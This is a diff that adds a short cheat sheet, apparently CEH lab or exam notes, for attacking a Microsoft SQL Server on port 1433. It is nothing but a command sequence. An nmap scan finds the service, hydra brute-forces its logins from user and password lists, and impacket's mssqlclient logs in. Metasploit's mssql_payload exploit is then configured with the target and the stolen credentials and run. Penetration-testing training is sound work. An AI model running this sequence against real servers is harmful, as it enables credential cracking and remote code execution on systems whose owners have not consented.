@@ -1,0 +1,30 @@
+MSSQL * Linux 
+
+# UseCase: 
+To exploit mssql server on port 1433 
+___________________________________________________
+
+$ nmap -p 1433 target-subnet [Try on all provided Subnet]
+
+$ hydra -L path-to-user-file -P path-to-passwd-file Target-Ip mssql
+
+$ python3 /root/impacket/examples/mssqlclient.py SKILL.CEH.com/(User-name:Passwd)@Target-IP -port 1433 
+[To know the NEW Database Name]
+
+$ msfconsole
+
+$ use exploit/windows/mssql/mssql_payload
+
+$ set RHOST Target-IP 
+
+$ set USERNAME (Mssql-User-Name)
+
+$ set PASSWORD (Passwd)
+
+$ set DATABASE (new-database-name)
+
+$ exploit 
+
+___________________________________________________
+
+ 
